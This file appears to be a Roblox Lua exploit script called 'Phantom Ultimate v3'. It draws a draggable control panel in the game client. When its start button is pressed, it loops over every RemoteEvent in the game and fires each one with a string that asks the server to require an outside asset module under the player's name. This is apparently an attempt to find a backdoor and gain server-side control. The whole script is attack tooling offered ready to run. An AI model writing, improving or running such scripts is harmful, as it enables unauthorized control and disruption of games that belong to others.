-- [[ PHANTOM ULTIMATE v3: COMPACT & FLOATING ]] --
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local lp = Players.LocalPlayer

-- Cleanup
if CoreGui:FindFirstChild("PhantomV3") then CoreGui.PhantomV3:Destroy() end

local sg = Instance.new("ScreenGui", CoreGui); sg.Name = "PhantomV3"
local active = false

-- [[ FUNGSI DRAG & UI FACTORY ]] --
local function makeDraggable(obj)
    local dragging, input, startPos, startInput
    obj.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true; startInput = i.Position; startPos = obj.Position end end)
    UIS.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then 
        local delta = i.Position - startInput
        obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end end)
    obj.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

-- [[ UI ELEMENTS ]] --
local Icon = Instance.new("TextButton", sg)
Icon.Size, Icon.Position, Icon.BackgroundColor3 = UDim2.new(0,45,0,45), UDim2.new(0.1,0,0.5,0), Color3.fromRGB(30,30,40)
Icon.Text, Icon.TextColor3, Icon.Font = "P", Color3.new(0,1,0.5), "GothamBold"
Instance.new("UICorner", Icon).CornerRadius = UDim.new(1,0)
makeDraggable(Icon)

local Main = Instance.new("Frame", sg)
Main.Size, Main.Position, Main.BackgroundColor3, Main.Visible = UDim2.new(0,260,0,320), UDim2.new(0.5,-130,0.5,-160), Color3.fromRGB(15,15,20), false
Instance.new("UICorner", Main)
local Stroke = Instance.new("UIStroke", Main); Stroke.Color = Color3.new(0,1,0.5); Stroke.Thickness = 1.5
makeDraggable(Main)

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text, Title.TextColor3, Title.BackgroundTransparency = UDim2.new(1,0,0,40), " PHANTOM ENGINE", Color3.new(1,1,1), 1
Title.Font, Title.TextSize, Title.TextXAlignment = "GothamBold", 14, "Left"

local Close = Instance.new("TextButton", Main)
Close.Size, Close.Position, Close.Text, Close.BackgroundColor3 = UDim2.new(0,30,0,30), UDim2.new(1,-35,0,5), "X", Color3.fromRGB(200,50,50)
Instance.new("UICorner", Close)

local LogBox = Instance.new("ScrollingFrame", Main)
LogBox.Size, LogBox.Position, LogBox.BackgroundColor3 = UDim2.new(0.9,0,0.7,0), UDim2.new(0.05,0,0.15,0), Color3.new(0,0,0)
local LogList = Instance.new("UIListLayout", LogBox)

local Switch = Instance.new("TextButton", Main)
Switch.Size, Switch.Position, Switch.Text = UDim2.new(0.9,0,0,35), UDim2.new(0.05,0,0.87,0), "START ENGINE"
Switch.BackgroundColor3, Switch.Font = Color3.fromRGB(40,40,50), "GothamBold"
Instance.new("UICorner", Switch)

-- [[ LOGIC ]] --
local function AddLog(txt, col)
    local l = Instance.new("TextLabel", LogBox)
    l.Size, l.Text, l.TextColor3, l.BackgroundTransparency = UDim2.new(1,0,0,18), "> "..txt, col or Color3.new(1,1,1), 1
    l.TextSize, l.Font, l.TextXAlignment = 10, "Code", "Left"
    LogBox.CanvasSize = UDim2.new(0,0,0,LogList.AbsoluteContentSize.Y)
end

Icon.MouseButton1Click:Connect(function() Main.Visible = true; Icon.Visible = false end)
Close.MouseButton1Click:Connect(function() Main.Visible = false; Icon.Visible = true end)

Switch.MouseButton1Click:Connect(function()
    active = not active
    if active then
        Switch.Text, Switch.BackgroundColor3 = "STOP ENGINE", Color3.fromRGB(85, 255, 127)
        AddLog("Engine Starting...", Color3.new(1,1,0))
        task.spawn(function()
            -- Auto-Scan Remotes
            local remotes = 0
            for _, v in pairs(ReplicatedStorage:GetDescendants()) do
                if v:IsA("RemoteEvent") and active then 
                    v:FireServer("require(5021815801):Fire('"..lp.Name.."')")
                    remotes = remotes + 1
                    if remotes % 5 == 0 then task.wait(0.1) end
                end
            end
            AddLog("Injected " .. remotes .. " Remotes", Color3.new(0,1,0))
        end)
    else
        Switch.Text, Switch.BackgroundColor3 = "START ENGINE", Color3.fromRGB(40,40,50)
        AddLog("Engine Stopped", Color3.new(1,0,0))
    end
end)

AddLog("Phantom V3 Loaded.", Color3.new(0.5,0.5,0.5))
